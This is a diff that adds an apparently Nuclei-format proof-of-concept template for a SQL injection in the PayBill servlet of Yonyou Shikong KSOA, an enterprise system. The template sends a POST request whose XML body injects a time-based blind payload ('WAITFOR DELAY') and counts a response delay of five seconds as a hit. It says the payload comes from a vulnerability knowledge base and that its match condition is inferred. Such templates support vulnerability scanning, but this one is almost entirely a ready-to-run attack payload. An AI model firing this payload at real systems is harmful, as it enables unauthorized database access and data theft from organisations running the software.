@@ -1,0 +1,42 @@
+id: poc-zhtdwyd1gx8diago
+info:
+  name: 用友时空KSOA PayBill SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zhtdwyd1gx8diago
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zhtdwyd1gx8diago
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
+
+
+
+
+    <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1''WAITFOR DELAY ''00:00:05'';-</name><name>1</name><name>102360</name></root>
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
